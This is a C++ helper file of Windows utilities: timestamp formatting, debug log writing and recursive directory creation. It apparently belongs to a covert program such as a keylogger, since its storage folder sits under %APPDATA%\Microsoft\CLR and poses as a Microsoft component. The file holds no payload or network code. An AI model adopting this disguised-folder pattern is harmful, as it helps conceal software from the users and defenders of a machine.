
#include <windows.h>
#include <fstream>
#include <iomanip>
#include "tools.h"

namespace TOOLS
{

template <class T>
std::string ToString (const T & e)
{
    std::ostringstream s;
    s << e;
    return s.str();
}

std::string int_to_hex(unsigned long i )
{
    std::stringstream stream;
    stream << std::setfill ('0') << std::setw(2) << std::hex << i;
    return stream.str();
}

std::string GetDateTimeString (const std::string &sep)
{
    time_t ms;
    time (&ms);
    struct tm *info = localtime(&ms);

    return std::string(info->tm_mday < 10 ? "0" : "") + ToString (info->tm_mday) +
           std::string ((info->tm_mon + 1) < 10 ? ".0" : ".") +
           ToString (info->tm_mon + 1) + "." + ToString (1900 + info->tm_year) +
           "-" + std::string(info->tm_hour < 10 ? "0" : "") + ToString (info->tm_hour)
           + sep + std::string (info->tm_min < 10 ? "0" : "") + ToString (info->tm_min)
           + sep+ std::string (info->tm_sec < 10 ? "0" : "") + ToString (info->tm_sec);
}

void WriteAppLog (const std::string &s)
{
#ifndef NDEBUG
    std::ofstream file (TOOLS_DIR, std::ios::app);
    file << "[" << TOOLS::GetDateTimeString(":") << "]" << "\n" << s << std::endl << "\n";
    file.close();
#endif /* NDEBUG */
}

void WriteFile (const std::string &s, const std::string &filename)
{
#ifndef NDEBUG
    std::ofstream file (filename, std::ios::app);
    file << "[" << TOOLS::GetDateTimeString(":") << "]" << "\n" << s << std::endl << "\n";
    file.close();
#endif /* NDEBUG */
}

std::string GetOurPath (const bool append_separarator)
{
    std::string dir (getenv("APPDATA"));
    dir += "\\Microsoft\\CLR";
    return dir + (append_separarator ? "\\" : "");
}

bool MkOneDr (std::string path)
{
    return (bool)CreateDirectory (path.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS;
}

bool MkDir (std::string path)
{
    for (char &c : path)
        if (c == '\\')
        {
            c = '\0';
            if (!MkOneDr(path))
                return false;

            c = '\\';
        }
    return true;
}

}
